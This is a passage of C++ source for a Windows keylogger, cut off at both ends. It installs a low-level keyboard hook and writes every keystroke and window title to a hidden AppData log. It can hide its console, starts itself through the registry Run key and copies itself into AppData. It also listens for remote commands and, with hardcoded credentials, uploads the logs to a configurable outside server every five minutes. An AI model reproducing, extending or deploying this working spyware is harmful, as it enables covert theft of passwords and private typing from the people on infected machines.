            if (PtInRect(&buttonRect, pt))
            {
                DestroyWindow(hWnd);
                g_hWelcomeWnd = NULL;
            }
        }
        return 0;
    }
    case WM_DESTROY:
        g_hWelcomeWnd = NULL;
        g_mousePos = { -1, -1 };
        g_isButtonPressed = false;
        g_isDragging = false;
        return 0;
    default:
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }
}

void ShowWelcomeWindow()
{
    static bool classRegistered = false;
    static const wchar_t* className = L"KeyloggerWelcomeClass";
    
    if (!classRegistered)
    {
        WNDCLASS wc = { 0 };
        wc.lpfnWndProc = WelcomeWndProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = className;
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
        RegisterClass(&wc);
        classRegistered = true;
    }
    
    if (g_hWelcomeWnd && IsWindow(g_hWelcomeWnd))
    {
        SetForegroundWindow(g_hWelcomeWnd);
        return;
    }
    
    int width = 480;
    int height = 480;
    int x = (GetSystemMetrics(SM_CXSCREEN) - width) / 2;
    int y = (GetSystemMetrics(SM_CYSCREEN) - height) / 2;
    
    // 创建窗口时添加 WS_EX_LAYERED 样式以支持阴影效果
    g_hWelcomeWnd = CreateWindowEx(
        WS_EX_WINDOWEDGE | WS_EX_LAYERED,
        className,
        L"Keylogger",
        WS_POPUP | WS_VISIBLE,
        x, y, width, height,
        NULL,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );
    
    if (g_hWelcomeWnd)
    {
        // 设置窗口的透明度为 255（完全不透明）
        SetLayeredWindowAttributes(g_hWelcomeWnd, 0, 255, LWA_ALPHA);
        
        ShowWindow(g_hWelcomeWnd, SW_SHOW);
        UpdateWindow(g_hWelcomeWnd);
    }
}

KBDLLHOOKSTRUCT kbdStruct;
int Save(int key_stroke);
std::ofstream output_file;

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore 
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0;
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] " << "\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* APP_NAME = L"MyKeylogger";

std::wstring GetModulePath()
{
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

bool IsAutoStartEnabled()
{
    HKEY hKey;
    bool enabled = false;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        wchar_t value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, APP_NAME, NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
        {
            enabled = (GetModulePath() == value);
        }
        RegCloseKey(hKey);
    }
    return enabled;
}

bool SetAutoStart(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    bool result = false;
    if (enable)
    {
        std::wstring path = GetModulePath();
        result = (RegSetValueExW(hKey, APP_NAME, 0, REG_SZ, (BYTE*)path.c_str(), (DWORD)((path.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS);
    }
    else
    {
        result = (RegDeleteValueW(hKey, APP_NAME) == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return result;
}

const wchar_t* SILENT_MODE_VALUE = L"SilentMode";

bool IsSilentMode()
{
    HKEY hKey;
    DWORD value = 0, size = sizeof(value);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, SILENT_MODE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return false;
}

bool SetSilentMode(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = enable ? 1 : 0;
    bool result = (RegSetValueExW(hKey, SILENT_MODE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

// 录制状态注册表项
const wchar_t* RECORDING_STATE_VALUE = L"RecordingState";

// 获取保存的录制状态
bool GetSavedRecordingState()
{
    HKEY hKey;
    DWORD value = 1, size = sizeof(value); // 默认开始录制
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, RECORDING_STATE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return true; // 默认开始录制
}

// 保存录制状态
bool SaveRecordingState(bool isRecording)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = isRecording ? 1 : 0;
    bool result = (RegSetValueExW(hKey, RECORDING_STATE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

std::string GetLocalIPAddress()
{
    std::string ip = "unknown";
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return ip;

    char hostname[256] = { 0 };
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        WSACleanup();
        return ip;
    }

    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = nullptr;
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        WSACleanup();
        return ip;
    }

    std::string fallback_ip = "unknown";

    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
            char ipstr[INET_ADDRSTRLEN] = { 0 };
            sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
            InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
            std::string candidate(ipstr);

            if (candidate.rfind("10.88.", 0) == 0)
            {
                ip = candidate;
                break;
            }

            if (candidate != "127.0.0.1" && !candidate.empty() && fallback_ip == "unknown")
            {
                fallback_ip = candidate;
            }
        }
    }

    freeaddrinfo(result);
    WSACleanup();

    if (ip == "unknown")
    {
        ip = fallback_ip;
    }

    return ip;
}

std::string GetDateString()
{
    char buf[32] = { 0 };
    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
    return std::string(buf);
}

std::string GetLogDirectory()
{
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
    {
        std::wstring appdata(path);
        std::wstring logDirW = appdata + L"\\Keylogger";
        if (!fs::exists(logDirW))
        {
            fs::create_directories(logDirW);
        }
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
        std::string logDir(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
        return logDir;
    }
    return ".\\";
}

std::string MakeOutputFilename()
{
    std::string ip = GetLocalIPAddress();
    for (char& c : ip)
    {
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
            c = '-';
    }
    std::string date = GetDateString();
    std::string filename = ip + "_" + date + ".log";
    std::string logDir = GetLogDirectory();
    return logDir + "\\" + filename;
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    }
    catch (std::bad_alloc&) {
        return 0;
    }
    return newLength;
}

std::string readFileContent(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Cannot open file: " << filePath << std::endl;
        return "";
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::string buffer(size, '\0');
    if (!file.read(&buffer[0], size)) {
        std::cerr << "Failed to read file: " << filePath << std::endl;
        return "";
    }
    return buffer;
}

std::string getExecutableDir() {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        std::cerr << "Failed to get program path, error: " << GetLastError() << std::endl;
        return "";
    }
    std::string path(exePath, len);
    size_t lastSlash = path.find_last_of("\\/");
    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
}

std::string findLatestLogFile(const std::string& dir) {
    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        std::cerr << "Directory not found or invalid: " << dir << std::endl;
        return "";
    }

    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::pair<std::string, std::string>> validLogs;

    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                std::string dateStr = match[2].str();
                validLogs.emplace_back(fileName, dateStr);
                std::cout << "Found log file: " << fileName << ", date: " << dateStr << std::endl;
            }
        }
    }

    if (validLogs.empty()) {
        std::cerr << "No log files found (<IP>_<YYYYMMDD>.log)" << std::endl;
        return "";
    }

    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return a.second > b.second;
        });

    return dir + "\\" + validLogs[0].first;
}

// 删除指定的日志文件
bool deleteLogFile(const std::string& dir, const std::string& fileName) {
    // 验证文件名格式
    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    if (!std::regex_match(fileName, logPattern)) {
        std::cerr << "Invalid log file name: " << fileName << std::endl;
        return false;
    }

    std::string filePath = dir + "\\" + fileName;

    // 检查文件是否存在
    if (!fs::exists(filePath)) {
        std::cerr << "Log file not found: " << filePath << std::endl;
        return false;
    }

    // 检查是否是常规文件
    if (!fs::is_regular_file(filePath)) {
        std::cerr << "Not a regular file: " << filePath << std::endl;
        return false;
    }

    // 尝试删除文件
    try {
        // 先设置文件属性为正常（防止文件被标记为只读）
        SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);

        // 删除文件
        if (fs::remove(filePath)) {
            std::cout << "Successfully deleted log file: " << fileName << std::endl;
            return true;
        }
        else {
            std::cerr << "Failed to delete log file: " << fileName << std::endl;
            return false;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception when deleting file: " << e.what() << std::endl;
        return false;
    }
}

// 获取日志文件数量和详细信息
json getLogFilesInfo(const std::string& dir) {
    json result;
    result["total_count"] = 0;
    result["total_size"] = 0;
    result["files"] = json::array();

    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        return result;
    }

    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::tuple<std::string, std::string, uintmax_t>> validLogs;

    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                std::string dateStr = match[2].str();
                uintmax_t fileSize = entry.file_size();
                validLogs.emplace_back(fileName, dateStr, fileSize);
            }
        }
    }

    // 按日期降序排序（最新的在前）
    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return std::get<1>(a) > std::get<1>(b);
        });

    result["total_count"] = validLogs.size();

    uintmax_t totalSize = 0;
    for (const auto& log : validLogs) {
        json fileInfo;
        fileInfo["name"] = std::get<0>(log);
        fileInfo["date"] = std::get<1>(log);
        fileInfo["size"] = std::get<2>(log);
        totalSize += std::get<2>(log);
        result["files"].push_back(fileInfo);
    }
    result["total_size"] = totalSize;

    return result;
}

std::string api_get() {
    CURL* curl = curl_easy_init();
    std::string response_string;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/auth/login";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        const char* data = R"({"username": "keylogger_server", "password": "114514"})";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Login request failed: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            try {
                json j = json::parse(response_string);
                if (j["code"] == 200 && j["data"].contains("token")) {
                    return j["data"]["token"];
                }
                else {
                    std::cerr << "Login failed: " << response_string << std::endl;
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Failed to parse login response: " << e.what() << std::endl;
            }
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    return "";
}

bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
{
    if (token.empty()) {
        std::cerr << "Token is empty, cannot upload" << std::endl;
        return false;
    }

    std::string fileContent = readFileContent(localFilePath);
    if (fileContent.empty()) {
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl init failed" << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
    std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/fs/put";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
    headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
    headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        std::cerr << "Upload failed: " << curl_easy_strerror(res) << std::endl;
        return false;
    }
    std::cout << "Upload response: " << response << std::endl;
    return true;
}

void uploadLatestLog()
{
    std::string token = api_get();
    if (token.empty()) {
        std::cerr << "Failed to get token, cancel upload" << std::endl;
        return;
    }

    std::string logDir = GetLogDirectory();
    if (logDir.empty()) return;

    std::string latestLogPath = findLatestLogFile(logDir);
    if (latestLogPath.empty()) return;

    fs::path logPath(latestLogPath);
    std::string fileName = logPath.filename().string();
    std::string serverFile = "/log/" + fileName;

    bool success = uploadFile(token, latestLogPath, serverFile);
    if (!success) {
        std::cerr << "Upload failed" << std::endl;
    }
}

DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
{
    while (uploadEnabled && uploadThreadRunning)
    {
        uploadLatestLog();
        for (int i = 0; i < 300 && uploadEnabled && uploadThreadRunning; ++i)
            Sleep(1000);
    }
    uploadThreadRunning = false;
    return 0;
}

std::string ProcessCommand(const std::string& command)
{
    json response;
    response["status"] = "ok";

    try {
        json cmd = json::parse(command);
        std::string action = cmd.value("action", "");

        if (action == "ping") {
            response["type"] = "pong";
            response["data"]["recording"] = isRecording;
            response["data"]["upload_enabled"] = uploadEnabled.load();
            response["data"]["local_port"] = g_localPort;
            response["data"]["ip"] = GetLocalIPAddress();
        }
        else if (action == "start_upload") {
            if (!uploadEnabled) {
                uploadEnabled = true;
                uploadThreadRunning = true;
                hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
                if (hUploadThread) CloseHandle(hUploadThread);
            }
            response["type"] = "upload_started";
        }
        else if (action == "stop_upload") {
            uploadEnabled = false;
            uploadThreadRunning = false;
            response["type"] = "upload_stopped";
        }
        else if (action == "upload_once") {
            uploadLatestLog();
            response["type"] = "upload_completed";
        }
        else if (action == "pause_record") {
            isRecording = false;
            SaveRecordingState(isRecording);
            response["type"] = "record_paused";
        }
        else if (action == "resume_record") {
            isRecording = true;
            SaveRecordingState(isRecording);
            response["type"] = "record_resumed";
        }
        else if (action == "get_status") {
            response["type"] = "status";
            response["data"]["recording"] = isRecording;
            response["data"]["upload_enabled"] = uploadEnabled.load();
            response["data"]["local_port"] = g_localPort;
            response["data"]["ip"] = GetLocalIPAddress();
            response["data"]["log_dir"] = GetLogDirectory();
        }
        else if (action == "get_logs_info") {
            response["type"] = "logs_info";
            std::string logDir = GetLogDirectory();
            response["data"] = getLogFilesInfo(logDir);
        }
        else if (action == "set_server") {
            std::lock_guard<std::mutex> lock(g_configMutex);
            if (cmd.contains("host")) {
                g_serverHost = cmd["host"].get<std::string>();
            }
            if (cmd.contains("port")) {
                g_serverPort = cmd["port"].get<int>();
            }
            response["type"] = "server_configured";
            response["data"]["host"] = g_serverHost;
            response["data"]["port"] = g_serverPort;
        }
        else if (action == "delete_log") {
            if (cmd.contains("file")) {
                std::string fileName = cmd["file"].get<std::string>();
                std::string logDir = GetLogDirectory();
                bool success = deleteLogFile(logDir, fileName);
                response["type"] = "log_deleted";
                response["data"]["success"] = success;
                response["data"]["file"] = fileName;
            }
            else {
                response["status"] = "error";
                response["message"] = "Missing 'file' parameter";
            }
        }
        else {
            response["status"] = "error";
            response["message"] = "unknown action";
        }
    }
    catch (const std::exception& e) {
        response["status"] = "error";
        response["message"] = e.what();
    }

    return response.dump();
}

void HandleClient(SOCKET clientSocket)
{
    char buffer[4096];
    std::string accumulated;

    std::cout << "Client connected, socket: " << clientSocket << std::endl;

    // 设置接收超时
    DWORD timeout = 30000; // 30秒
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (serverControlEnabled) {
        int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (received == 0) {
            std::cout << "Client closed connection gracefully" << std::endl;
            break;
        }
        if (received < 0) {
            int error = WSAGetLastError();
            if (error == WSAETIMEDOUT) {
                std::cout << "Receive timeout, continuing..." << std::endl;
                continue;
            }
            if (error == WSAEWOULDBLOCK) {
                Sleep(100);
                continue;
            }
            std::cout << "Client disconnected, error code: " << error << std::endl;
            break;
        }

        buffer[received] = '\0';
        std::cout << "Received " << received << " bytes: " << buffer << std::endl;
        accumulated += buffer;

        size_t pos;
        while ((pos = accumulated.find('\n')) != std::string::npos) {
            std::string command = accumulated.substr(0, pos);
            accumulated = accumulated.substr(pos + 1);

            if (!command.empty()) {
                std::cout << "Processing command: " << command << std::endl;
                std::string response = ProcessCommand(command);
                response += "\n";
                std::cout << "Sending response: " << response << std::endl;
                int sent = send(clientSocket, response.c_str(), (int)response.length(), 0);
                if (sent == SOCKET_ERROR) {
                    int sendError = WSAGetLastError();
                    std::cerr << "Failed to send response, error: " << sendError << std::endl;
                }
                else {
                    std::cout << "Sent " << sent << " bytes" << std::endl;
                }
            }
        }
    }

    closesocket(clientSocket);
    std::cout << "Client connection closed" << std::endl;
}

DWORD WINAPI ServerThreadFunc(LPVOID lpParam)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create listen socket" << std::endl;
        WSACleanup();
        return 1;
    }

    int reuse = 1;
    setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(g_localPort);

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to bind port " << g_localPort << ", error: " << WSAGetLastError() << std::endl;
        std::cerr << "Trying dynamic port..." << std::endl;

        serverAddr.sin_port = 0;
        if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Failed to bind dynamic port, error: " << WSAGetLastError() << std::endl;
            closesocket(listenSocket);
            WSACleanup();
            return 1;
        }
    }

    sockaddr_in boundAddr;
    int addrLen = sizeof(boundAddr);
    getsockname(listenSocket, (sockaddr*)&boundAddr, &addrLen);
    g_localPort = ntohs(boundAddr.sin_port);

    std::cout << "Server listening on port: " << g_localPort << std::endl;

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed" << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    while (serverControlEnabled && serverThreadRunning) {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(listenSocket, &readSet);

        timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        int result = select(0, &readSet, NULL, NULL, &timeout);
        if (result == SOCKET_ERROR) {
            std::cerr << "select() failed, error: " << WSAGetLastError() << std::endl;
            Sleep(1000);
            continue;
        }

        if (result > 0 && FD_ISSET(listenSocket, &readSet)) {
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrLen);
            if (clientSocket != INVALID_SOCKET) {
                char clientIp[INET_ADDRSTRLEN];
                InetNtopA(AF_INET, &clientAddr.sin_addr, clientIp, INET_ADDRSTRLEN);
                std::cout << "New connection from: " << clientIp << ":" << ntohs(clientAddr.sin_port) << std::endl;

                std::thread clientThread(HandleClient, clientSocket);
                clientThread.detach();
            }
            else {
                std::cerr << "accept() failed, error: " << WSAGetLastError() << std::endl;
            }
        }
    }

    closesocket(listenSocket);
    WSACleanup();
    serverThreadRunning = false;
    std::cout << "Server thread stopped" << std::endl;
    return 0;
}

void StartServerControl()
{
    if (!serverThreadRunning) {
        serverThreadRunning = true;
        serverControlEnabled = true;
        hServerThread = CreateThread(NULL, 0, ServerThreadFunc, NULL, 0, NULL);
        if (hServerThread) {
            CloseHandle(hServerThread);
        }
    }
}

void StopServerControl()
{
    serverControlEnabled = false;
    serverThreadRunning = false;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            if (kbdStruct.vkCode == 'P' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
            {
                isRecording = !isRecording;
                // 保存录制状态到注册表
                SaveRecordingState(isRecording);

                if (isRecording)
                {
                    std::cout << "Recording resumed\n";
                    ShowTransparentSquare(g_hNotifyWnd, RGB(0, 255, 0)); // 绿色 - 继续录制
                }
                else
                {
                    std::cout << "Recording paused\n";
                    ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 暂停录制
                }
            }
            else if (kbdStruct.vkCode == 'Q' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
            {
                std::cout << "Recording stopped\n";
                
                StopServerControl();
                CleanupNotifyIcon();
                ReleaseHook();
                output_file.close();
                exit(0);
            }
            else if (kbdStruct.vkCode == 'S' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
            {
                bool enabled = IsAutoStartEnabled();
                std::cout << "Current auto-start: " << enabled << std::endl;
                if (SetAutoStart(!enabled))
                {
                    std::cout << "Auto-start toggled to: " << !enabled << std::endl;
                    if (!enabled)
                        ShowTransparentSquare(g_hNotifyWnd, RGB(0, 0, 255)); // 蓝色 - 启用开机自启
                    else
                        ShowTransparentSquare(g_hNotifyWnd, RGB(0, 128, 255)); // 浅蓝色 - 禁用开机自启
                }
                else
                {
                    std::cout << "Failed to toggle auto-start" << std::endl;
                    ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 错误
                }
            }
            else if (kbdStruct.vkCode == 'D' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
            {
                bool silent = IsSilentMode();
                std::cout << "Current silent mode: " << silent << std::endl;
                if (SetSilentMode(!silent))
                {
                    std::cout << "Silent mode toggled to: " << !silent << std::endl;
                    if (!silent)
                        ShowTransparentSquare(g_hNotifyWnd, RGB(255, 255, 0)); // 黄色 - 启用静默模式
                    else
                        ShowTransparentSquare(g_hNotifyWnd, RGB(255, 192, 0)); // 橙色 - 禁用静默模式
                }
                else
                {
                    std::cout << "Failed to toggle silent mode" << std::endl;
                    ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 错误
                }
            }
            else
            {
                if (isRecording)
                {
                    Save(kbdStruct.vkCode);
                }
            }
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
{
    if (fs::exists(shortcutPath))
        return true;

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return false;
    IShellLinkW* psl = NULL;
    IPersistFile* ppf = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
    if (SUCCEEDED(hr))
    {
        psl->SetPath(targetPath.c_str());
        psl->SetDescription(L"Keyboard Logger");
        hr = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
        if (SUCCEEDED(hr))
        {
            hr = ppf->Save(shortcutPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}

void HandleSelfCopyAndDelete()
{
    wchar_t appdataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
        return;

    std::wstring targetDir = std::wstring(appdataPath) + L"\\Keylogger";
    fs::create_directories(targetDir);

    std::wstring currentExe = GetModulePath();
    std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();

    if (currentExe != targetExe)
    {
        if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
        {
